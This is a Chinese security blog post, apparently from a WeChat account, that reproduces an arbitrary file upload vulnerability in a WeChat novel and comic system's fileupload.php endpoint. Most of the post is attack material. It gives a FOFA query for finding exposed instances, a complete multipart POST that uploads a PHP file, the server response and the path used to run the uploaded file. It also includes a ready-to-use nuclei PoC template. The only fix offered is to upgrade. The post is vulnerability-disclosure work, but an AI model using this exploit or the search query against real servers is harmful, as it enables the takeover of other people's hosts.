#  微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞复现   
原创 fgz  AI与网安   2024-10-10 21:08  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
微信公众号  
小说漫画系统，版本不详 。  
  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
微信公众号小说漫画系统  
内置了丰富的小说和漫画资源，涵盖各类题材和风格，满足不同用户的阅读需求。  
同时，它还支持作者入驻和作品上传。能够支持多终端访问，如微信小程序、H5网页、微信公众号以及原生APP等。该系统  
fileupload.php接口处存在任意文件上传漏洞，请及时修复，否则会导致主机失陷。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
"/Public/home/mhjs/jquery.js"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMjTlP4eAgX6Zc4HxQoYayp7zibULEqETNK2WI8dOA4BnjHc5F2noibDhuLibfbMzwZic9GhnOFZ68VQ/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
向靶场发送如下数据包  
```
POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
Host: X.X.X.X
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 221
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqvlfcogulumndzor
Accept-Encoding: gzip

------WebKitFormBoundaryqvlfcogulumndzor
Content-Disposition: form-data; name="file"; filename="fpgemjsu.php"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryqvlfcogulumndzor
```  
  
响应内容如下  
```
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Content-Type: text/html; charset=UTF-8
Date: Thu, 10 Oct 2024 12:42:56 GMT
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Thu, 10 Oct 2024 12:42:56 GMT
Pragma: no-cache
Server: nginx
Vary: Accept-Encoding

{"jsonrpc" : "2.0", "result" : null, "id" : "id"}
```  
  
2.访问回显文件  
```
Public/webuploader/0.1.5/server/upload/fpgemjsu.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPiaKgKwc8Fy4NUlHoDno5xV3VCYovUicqtLSwIUKibBhUVyRB3BILT4Ouvyaiag6Unq3ZGceicCxJgNHA/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现成功  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: WeChatOfficialAccountNovelComic-fileupload

info:
  name: 微信公众号小说漫画系统 fileupload.php 任意文件上传漏洞
  author: fgz
  severity: critical
  description: 微信公众号小说漫画系统内置了丰富的小说和漫画资源，涵盖各类题材和风格，满足不同用户的阅读需求。同时，它还支持作者入驻和作品上传。能够支持多终端访问，如微信小程序、H5网页、微信公众号以及原生APP等。该系统fileupload.php接口处存在任意文件上传漏洞，请及时修复，否则会导致主机失陷。
  metadata:
    max-request: 1
    fofa-query: "/Public/home/mhjs/jquery.js"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  file_content: "{{to_lower(rand_text_alpha(20))}}"
  rboundary: "{{to_lower(rand_text_alpha(16))}}"
requests:
  - raw:
      - |+
        POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
        
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{file_name}}.php"
        Content-Type: image/jpeg
        
        <?php phpinfo();unlink(__FILE__);?>
        ------WebKitFormBoundary{{rboundary}}

      - |
        GET /Public/webuploader/0.1.5/server/upload/{{file_name}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

    extractors:
      - type: json
        part: body
        name: path
        json:
          - '.name'
        internal: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, 'PHP Version') && contains(body_2, 'PHP API')"

```  
  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
